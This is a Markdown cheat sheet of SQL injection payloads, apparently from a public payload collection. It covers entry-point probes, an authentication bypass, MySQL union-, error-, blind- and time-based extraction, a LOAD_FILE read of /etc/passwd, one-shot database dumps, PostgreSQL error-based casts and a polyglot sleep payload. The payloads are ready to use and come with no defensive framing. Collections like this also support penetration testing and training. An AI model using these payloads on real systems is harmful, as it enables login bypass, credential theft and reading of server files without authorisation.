# SQL injection
A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application	

## Authentication bypass and Entry point detection

Detection of an SQL injection entry point
```
'
"
%27
" / %22
; / %3B
%%2727
%25%27
`+HERP
'||'DERP
'+'herp
' ' DERP
Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")
Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')
```


Authentication bypass - use the file "Authentication Bypass.txt"
```
SELECT id FROM users WHERE username='input1' AND password='input2'
SELECT id FROM users WHERE username='' or true-- AND password='input2'
```


# MYSQL
MySQL Union Based
```
gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```


MySQL Error Based - Basic
```
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
```

MYSQL Error Based - UpdateXML function
```
AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

MYSQL Error Based - Extractvalue function
``` 
AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
```

MySQL Blind with MAKE_SET
```
MAKE_SET(YOLO<(SELECT(length(version()))),1)
MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)
MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
```


MySQL Time Based
```
+BENCHMARK(40000000,SHA1(1337))+
```


MySQL Read content of a file
```
' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
```

MySQL DIOS - Dump in One Shot
```
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#

```

# POSTGRESQL

PostgreSQL Error Based - Basic
```
,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name=data_column+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)
```

# Other usefull payloads

Polyglot injection (multicontext)
```
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## Thanks to
* http://www.sqlinjectionwiki.com/Categories/2/mysql-sql-injection-cheat-sheet/